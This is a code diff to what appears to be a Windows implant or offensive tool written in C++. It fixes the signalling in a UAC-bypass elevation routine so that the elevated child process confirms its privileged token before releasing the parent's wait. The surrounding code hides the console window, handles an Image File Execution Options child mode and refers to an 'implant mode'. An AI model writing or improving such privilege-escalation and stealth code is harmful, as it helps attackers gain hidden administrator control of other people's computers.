@@ -6991,11 +6991,9 @@ int main(int argc, char* argv[]) {
     if (uacChild || ifeoChild) {
         if (HWND cw = GetConsoleWindow()) ShowWindow(cw, SW_HIDE);
     }
-    if (uacChild) {
-        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, g_uacEventName.c_str());
-        if (!ev) ev = CreateEventW(NULL, TRUE, FALSE, g_uacEventName.c_str());
-        if (ev) { SetEvent(ev); CloseHandle(ev); }
-    }
+    // The elevated child signals only after IsElevated() succeeds. Signalling
+    // here would let a non-elevated child report success and recurse into the
+    // bypass forever.
 
     if (safe) {
         // Refuse implant mode: only explicit harness actions are allowed, and
@@ -7169,6 +7167,9 @@ int main(int argc, char* argv[]) {
     }
 
     if (!IsElevated() && !noElevate) {
+        // A child that was launched for elevation but arrived without a
+        // privileged token must not start another round.
+        if (uacChild) return 1;
         wchar_t self[MAX_PATH]{};
         if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
             std::wstring tail = vex::utils::CommandLineTail();
@@ -7185,6 +7186,12 @@ int main(int argc, char* argv[]) {
             if (ShellExecuteExW(&sei)) return 0;
         }
         return 1;
+    }
+
+    // Confirmed elevation before the parent's 10-second wait is released.
+    if (uacChild && IsElevated()) {
+        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, g_uacEventName.c_str());
+        if (ev) { SetEvent(ev); CloseHandle(ev); }
     }
 
     if (!vex::crypto::Init()) return 1;
